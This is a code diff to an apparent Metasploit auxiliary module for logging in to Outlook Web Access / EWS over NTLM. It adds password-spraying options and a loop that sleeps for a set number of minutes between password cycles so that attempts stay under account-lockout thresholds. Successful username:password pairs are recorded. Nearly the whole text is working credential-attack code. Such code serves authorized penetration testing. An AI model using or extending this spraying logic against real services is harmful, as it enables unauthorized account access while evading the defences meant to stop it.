@@ -26,7 +26,7 @@ class MetasploitModule < Msf::Auxiliary
       },
       'Author'         => 'Rich Whitcroft',
       'License'        => MSF_LICENSE,
-      'DefaultOptions' => { 'SSL' => true, 'VERBOSE' => false }
+      'DefaultOptions' => { 'SSL' => true, 'VERBOSE' => false, 'PASSWORD_SPRAY' => true }
     )
 
     register_options(
@@ -34,6 +34,8 @@ class MetasploitModule < Msf::Auxiliary
         OptBool.new('AUTODISCOVER', [ false, "Automatically discover domain URI", true ]),
         OptString.new('AD_DOMAIN', [ false, "The Active Directory domain name", nil ]),
         OptString.new('TARGETURI', [ false, "The location of the NTLM service", nil ]),
+        OptInt.new('PASSWORDS_PER_CYCLE', [ false, "Number of passwords per cycle", nil ]),
+        OptInt.new('CYCLE_DELAY', [ false, "Time to wait between cycles, in minutes", nil ]),
         Opt::RPORT(443)
       ])
   end
@@ -75,13 +77,29 @@ class MetasploitModule < Msf::Auxiliary
       user_as_pass: datastore['USER_AS_PASS']
     )
 
-    creds.each do |cred|
+    # track the previous password so we know when the next cycle begins
+    prev_password = nil
+    cycles = 0
+
+    each_user_pass do |user, pass|
+      if !datastore['CYCLE_DELAY'].nil? && !datastore['PASSWORDS_PER_CYCLE'].nil?
+        if !prev_password.nil?
+          if prev_password != pass
+            cycles += 1
+            if cycles % datastore['PASSWORDS_PER_CYCLE'] == 0
+              print_status("Sleeping #{datastore['CYCLE_DELAY']} minutes between cycles")
+              sleep datastore['CYCLE_DELAY'] * 60
+            end
+          end
+        end
+      end
+
       begin
         req = cli.request_raw({
           'uri' => uri,
           'method' => 'GET',
-          'username' => cred.public,
-          'password' => cred.private
+          'username' => user,
+          'password' => pass
         })
 
         res = cli.send_recv(req)
@@ -91,19 +109,21 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       if res.code != 401
-        print_brute :level => :good, :ip => ip, :msg => "Successful login: #{cred.to_s}"
+        print_brute :level => :good, :ip => ip, :msg => "Successful login: #{user}:#{pass}"
         report_cred(
           ip: ip,
           port: datastore['RPORT'],
           service_name: 'owa_ews',
-          user: cred.public,
-          password: cred.private
+          user: user,
+          password: pass
         )
 
         return if datastore['STOP_ON_SUCCESS']
       else
-        vprint_brute :level => :verror, :ip => ip, :msg => "Failed login: #{cred.to_s}"
+        vprint_brute :level => :verror, :ip => ip, :msg => "Failed login: #{user}:#{pass}"
       end
+
+      prev_password = pass
     end
   end
 
